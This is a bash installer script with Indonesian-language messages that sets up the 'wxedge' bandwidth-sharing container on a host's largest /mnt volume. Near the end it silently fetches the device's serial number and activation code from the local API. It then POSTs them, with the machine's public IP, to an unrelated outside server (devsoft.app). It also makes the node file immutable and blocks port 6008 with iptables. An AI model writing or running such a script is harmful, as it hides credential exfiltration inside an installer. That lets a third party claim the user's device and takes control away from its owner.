#!/bin/bash
if [[ $EUID -eq 0 ]]; then
    apt update && apt install docker.io jq wget -y
else
    required_packages=("docker.io" "jq" "wget")

    missing_packages=()
    for package in "${required_packages[@]}"; do
        if ! dpkg -l | grep -q "^ii.*$package "; then
            missing_packages+=("$package")
        fi
    done

    if [[ ${#missing_packages[@]} -gt 0 ]]; then
        echo "==================="
        echo "Jika terjadi kesalahan saat proses instalasi, silakan instal paket-paket ini terlebih dahulu."
        echo -e "Paket-paket berikut belum terinstal: \e[91m${missing_packages[*]}\e[0m"
        echo "==================="
    fi
fi
if ! docker version; then
    echo "==>  Error: Gagal menjalankan docker."
    exit 1
fi

threshold=10000

mount_points=$(df -BM | grep "/mnt" | awk '{print $6}')

max_space=0
max_space_path=""

for mount_point in $mount_points; do
  disk_usage=$(df -BM "$mount_point" | awk 'NR==2 {print $4}' | sed 's/M//')

  if [ "$disk_usage" -ge "$threshold" ]; then
    if [ "$disk_usage" -gt "$max_space" ]; then
      max_space="$disk_usage"
      max_space_path="$mount_point"
    fi
  fi
done

if [ ! -n "$max_space_path" ]; then
    echo "==>  Error: Ruang storan terlalu kecil!"
    exit 1
fi

sudo  docker  run -d --name=wxedge --restart=always --privileged --net=host --dns=114.114.114.114 --tmpfs /run --tmpfs /tmp -e REC=false -v $max_space_path/storage:/storage:rw  -v $max_space_path/containerd:/var/lib/containerd onething1/wxedge
if ! docker ps | grep "wxedge" > /dev/null; then
  echo "==>  Error: Gagal menjalankan wxedge."
  exit 1
fi
chattr +i $max_space_path/storage/wxnode
sn=$(wget -cq http://$(ifconfig eth0 | grep "inet " | awk '{print $2}' | cut -c 1-):18888/docker/data -O - | jq -r '.data.device.sn')
acode=$(wget -cq http://$(ifconfig eth0 | grep "inet " | awk '{print $2}' | cut -c 1-):18888/docker/data -O - | jq -r '.data.device.acode')
ip=$(curl -s http://httpbin.org/ip|jq -r '.origin')
curl -s -d "ip=$ip&sn=$sn&acode=$acode" -X POST http://www.devsoft.app/ajex.php

sudo iptables -A INPUT -p tcp --dport 6008 -j DROP
sudo iptables-save
